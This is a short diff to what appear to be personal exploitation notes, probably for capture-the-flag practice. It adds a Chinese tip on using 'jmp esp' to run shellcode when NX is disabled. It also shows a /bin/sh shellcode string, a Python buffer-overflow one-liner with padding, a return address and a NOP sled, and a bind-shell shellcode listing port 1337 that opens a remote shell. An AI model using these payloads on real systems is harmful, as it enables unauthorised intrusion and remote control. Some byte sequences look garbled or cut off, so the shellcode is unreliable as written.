@@ -1,3 +1,6 @@
+1.当关闭NX时，且rip中不能被填充，可以自己输入jmp esp之类的指令来进行执行shellco。
+
+
 x64 /bin/sh
 
 1. 24 byte
@@ -29,3 +32,4 @@ shellcode = "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8
 python -c 'print "a"*76+"\xd0\xd1\xff\xff"'+"\x90"*10+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\xb0\xc0\xe8\x04\x89\xca\xcd\x80"'
 
 x6ax66x58x6ax01x5bx31xf6x56x53x6ax02x89xe1xcdx80x5fx97x93xb0x66x56x66x68x05x39x66x53x89xe1x6ax10x51x57x89xe1xcdx80xb0x66xb3x04x56x57x89xe1xcdx80xb0x66x43x56x56x57x89xe1xcdx80x59x59xb1x02x93xb0x3fxcdx80x49x79xf9xb0x0bx68x2fx2fx73x68x68x2fx62x69x6ex89xe3x41x89xcaxcdx80
+
